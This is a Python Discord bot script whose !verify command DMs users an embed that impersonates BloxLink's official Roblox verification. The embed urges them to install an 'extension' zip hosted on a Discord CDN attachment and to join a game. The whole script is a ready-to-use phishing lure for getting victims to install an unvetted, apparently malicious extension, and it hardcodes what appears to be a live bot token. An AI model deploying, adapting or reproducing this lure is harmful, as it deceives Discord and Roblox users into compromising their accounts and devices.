import discord
from discord.ext import commands
import requests


################### change these to your liking ###################

token = "MTAwMDM1MTMxNjQxNTA5NDgxNQ.GkM-nN.TlGfvE9mHYOBUzYD_uyZRR07tCEZ3eAUx2unvE"
prefix = "!"
title = "Please Complete Verification"
desc ="To verify your account, please join BloxLink's Official Roblox Verification Game AND add the extension"
field = "Please add the extension and then join the game"
hyperlink = "Extension"
Ext = "https://cdn.discordapp.com/attachments/992124413715697724/1000352410696429639/extension.zip"
Game = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
game = "Game"

###################################################################



client = commands.Bot(command_prefix = prefix)

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Bot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[**{hyperlink}**]({Ext}) [**{game}**]({Game})")


@client.command()
async def verify(ctx):
    await ctx.send('Sent verification info. Please check your DMs.')
    await ctx.author.send(embed=main)
  
async def help(ctx):
    await ctx.send('its very easy just do ```!verify```')
    await ctx.author.send(embed=main)





client.run(token)